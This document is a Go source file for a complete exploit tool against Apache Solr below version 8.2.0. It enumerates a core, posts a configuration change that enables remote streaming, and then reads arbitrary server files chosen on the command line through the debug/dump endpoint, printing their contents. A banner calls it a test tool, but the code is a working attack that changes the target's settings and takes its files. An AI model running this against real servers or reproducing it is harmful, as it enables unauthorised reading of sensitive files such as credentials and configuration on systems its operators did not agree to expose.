package main

import (
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

var HttpHeader = map[string] []string {"User-Agent": {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/85.0.4183.121 Safari/537.36"}}

func PrintBanner() {
	Banner := "+---------------------------------------------------------------------------\n"
	Banner += "+ Test Tool For Apache Solr Arbitrary File Read vulnerability!\n"
	Banner += "+ It is only used for test vulnerability, and shall not be used illegally,\n"
	Banner += "+ all consequences shall be borne by themselves!\n"
	Banner += "+ Version: Apache Solr < 8.2.0\n"
	Banner += "+---------------------------------------------------------------------------\n"

	fmt.Printf(Banner)
}

func GetCoreName(TestUrl string) (CoreName string, err error) {
	type CoreNameStruct1 struct {
		Name string `json:"name"`
		InstanceDir string `json:"instanceDir"`
		DataDir string `json:"dataDir"`
		Config string `json:"config"`
		Schema string `json:"schema"`
		StartTime string `json:"startTime"`
		Uptime int `json:"uptime"`
	}
	type CoreNameStruct struct {
		ResponseHeader map[string] int `json:"responseHeader"`
		InitFailures map[string] string `json:"initFailures"`
		Status map[string] CoreNameStruct1 `json:"status"`
	}

	var corenamestruct CoreNameStruct
	GetCoreNameUrl := TestUrl + "/solr/admin/cores?indexInfo=false&wt=json"

	req, err := http.NewRequest("GET", GetCoreNameUrl, nil)
	if err != nil {
		return
	}

	req.Header = HttpHeader

	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		return
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}

	if resp.Status != "200 OK" {
		err = errors.New("there is no vulnerability in the website")
		return
	}

	err = json.Unmarshal(body, &corenamestruct)
	if err != nil {
		return
	}

	for CoreName, _ = range corenamestruct.Status {
		break
	}

	return
}

func TestVul(TestUrl, CoreName string) (IsVul bool, err error) {
	type TestVulStruct struct {
		ResponseHeader map[string] int `json:"responseHeader"`
		WARNING string
	}

	var testvulstruct TestVulStruct
	VulUrl := TestUrl + "/solr/" + CoreName + "/config"
	data := strings.NewReader("{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}")

	req, err := http.NewRequest("POST", VulUrl, data)
	if err != nil {
		return
	}

	req.Header = HttpHeader
	req.Header.Add("Content-type", "application/json")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		return
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}

	err = json.Unmarshal(body, &testvulstruct)
	if err != nil {
		return
	}

	if strings.Index(testvulstruct.WARNING, "this") != -1 {
		IsVul = false
	} else {
		IsVul = true
	}

	return
}

func ExpReadFile(TestUrl, CoreName, FileName string) (FileContent string, err error) {
	type FileReadstreams struct {
		Name int `json:"name"`
		SourceInfo string `json:"sourceInfo"`
		Size int `json:"size"`
		ContentType int `json:"contentType"`
		Stream string `json:"stream"`
	}

	type FileReadRespHead struct {
		Status int `json:"status"`
		QTime int
		Handler string `json:"handler"`
		Params map[string] string `json:"params"`
	}

	type FileReadStruct struct {
		ResponseHeader FileReadRespHead `json:"responseHeader"`
		Params map[string] string `json:"params"`
		Streams []FileReadstreams `json:"streams"`
		Context map[string]string `json:"context"`
	}

	var filereadstruct FileReadStruct
	ReadFileURL := TestUrl + "/solr/" + CoreName + "/debug/dump?param=ContentStreams"
	data := strings.NewReader("stream.url=file://" + FileName)

	req, err := http.NewRequest("POST", ReadFileURL, data)
	if err != nil {
		return
	}

	req.Header = HttpHeader
	req.Header.Set("Content-type", "application/x-www-form-urlencoded")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		return
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}

	err = json.Unmarshal(body, &filereadstruct)
	if err != nil {
		return
	}

	if filereadstruct.ResponseHeader.Status == 0 {
		FileContent = filereadstruct.Streams[0].Stream
	} else {
		err = errors.New("file is not found")
	}

	return
}

func main() {
	host := flag.String("host", "127.0.0.1", "Server IP")
	port := flag.String("port", "80", "Server Port")
	file := flag.String("f", "", "File Name")
	flag.Parse()

	PrintBanner()

	var TestUrl string
	var FileName string
	var err error

	TestUrl = *host + ":" + *port
	FileName = *file

	if FileName == "" {
		PName := os.Args[0]
		fmt.Printf("Run '%s -h' for more help information on a command.\n", PName)
		os.Exit(0)
	}

	if !strings.HasPrefix(TestUrl, "http://") && !strings.HasPrefix(TestUrl, "https://") {
		TestUrl = "http://" + TestUrl
	}

	CoreName, err := GetCoreName(TestUrl)
	if err != nil {
		fmt.Println("[-] Exploit failure! err: ", err)
		os.Exit(1)
	}

	IsVul, err := TestVul(TestUrl, CoreName)
	if err != nil {
		fmt.Println("[-] Exploit failure! err: ", err)
		os.Exit(1)
	} else if !IsVul {
		fmt.Println("[-] It's seem no security vulnerability")
		os.Exit(0)
	} else {
		fmt.Println("[+] The site may be vulnerable")
	}

	FileContent, err := ExpReadFile(TestUrl, CoreName, FileName)
	if err != nil {
		fmt.Println("[-] File Read Err: ", err)
		os.Exit(1)
	}

	fmt.Println("[+] Exploit successfully: ")
	fmt.Printf("[%s] file content:\n", FileName)
	fmt.Println(FileContent)
}
